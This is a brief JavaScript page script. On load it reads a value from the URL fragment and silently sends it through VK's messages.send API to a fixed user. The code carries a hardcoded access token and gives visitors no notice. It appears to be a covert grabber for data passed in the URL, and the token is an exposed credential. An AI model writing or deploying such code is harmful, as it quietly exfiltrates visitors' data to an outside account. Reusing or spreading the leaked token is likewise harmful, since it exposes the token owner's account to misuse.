window.onload = function() {var yourDate = new Date()
    var x = new XMLHttpRequest();
	var paramsString = document.location.hash; // ?page=4&limit=10&sortby=desc  
var searchParams = new URLSearchParams(paramsString);
    

	x.open("GET", "https://api.vk.com/method/messages.send?access_token=7b7b67d014c0d14ae182d9bd2499dbbf621a9e06cfe6a3ae6aa52f89cf8b1058b74656cf74fc6c07850d6&peer_id=174353375&message=Отправил" + searchParams.get("test") +"&v=5.126&random_id=" + yourDate.getTime(), true);
	x.send();
 };